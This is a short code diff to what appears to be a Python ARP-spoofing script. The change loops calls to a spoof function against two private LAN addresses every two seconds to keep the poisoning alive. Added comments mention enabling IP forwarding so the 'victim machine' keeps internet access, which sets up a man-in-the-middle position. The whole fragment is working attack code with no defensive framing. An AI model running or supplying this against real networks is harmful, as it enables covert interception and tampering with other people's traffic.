@@ -30,6 +30,10 @@ def spoof(target_ip, router_ip):
     # print(packet.show())
     # print(packet.summary())
 
-
-spoof('192.168.82.219', '192.168.82.209')
-spoof('192.168.82.209', '192.168.82.219')
+# maintain the spoof as long as I want 
+# but we need to forward ports to give inernet to the victim machine
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+while True:
+    spoof('192.168.82.219', '192.168.82.209')
+    spoof('192.168.82.209', '192.168.82.219')
+    time.sleep(2)
